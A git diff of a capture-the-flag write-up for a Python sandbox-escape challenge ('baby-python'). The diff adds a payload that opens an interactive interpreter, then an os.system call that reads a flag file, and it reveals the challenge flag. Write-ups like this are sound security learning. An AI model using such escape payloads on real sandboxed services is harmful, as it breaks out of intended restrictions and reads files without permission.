@@ -10,7 +10,13 @@ nc baby-python.chal.uiuc.tf 1337
 I wasn't able to solve this challenge during the ctf, but found it pretty interesting. Apparently, there were a couple of ways to do this:
 
 ### Solution 1
-Apparently, the payload ```from code import interact as exit``` gives you a terminal where you could run ```cat flag.txt``` though I wasn't able to get this working, probably because the ctf ended a while ago and the server isn't running this challenge anymore.
+Apparently, the payload ```from code import interact as exit``` gives you a python terminal with which you can run:
+```
+import os
+os.system("cat /flag")
+```
+<img src ="https://user-images.githubusercontent.com/86171033/128443161-2c92651c-a5f5-419c-9316-9283bf97d29b.png" width=600 alt="image"/>
+
 
 ### Solution 2
 credits to k3v1n on the UIUCTF discord
@@ -29,6 +35,6 @@ r.sendline(b'')
 
 r.interactive()
 
-# uiuctf{just_kidding_about_the_chal_being_broken_lol_11a7b8}
 ```
+flag: ```uiuctf{just_kidding_about_the_chal_being_broken_lol_11a7b8}```
 
